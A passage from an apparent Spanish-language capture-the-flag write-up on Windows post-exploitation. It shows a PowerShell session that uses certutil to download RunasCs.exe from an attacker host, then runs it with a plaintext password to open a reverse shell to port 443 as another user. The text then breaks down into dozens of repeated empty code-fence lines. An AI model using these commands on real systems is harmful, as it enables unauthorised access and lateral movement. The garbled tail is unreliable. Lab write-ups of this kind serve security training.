CertUtil: An internal error occurred in the Microsoft Windows HTTP Services
PS C:\Windows\temp\test> certutil.exe -f -urlcache -split http://10.10.15.14:81/RunasCs.exe
****  Online  ****
  0000  ...
  ca00
CertUtil: -URLCache command completed successfully.

PS C:\Windows\temp\test> ls

    Directory: C:\Windows\temp\test

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/27/2024  10:46 AM          51712 RunasCs.exe                                                           

PS C:\Windows\temp\test> 

```
Ahora cremos una conexion con RunasCs, nos valemos de la guia .\RunasCs.exe --help para crear una revertshell con el usuario alaading no sin antes escuchar el puerto 443 en nuestro atacante
```bash

```
En el servidor
```powershell
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.15.14:443
```

```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash


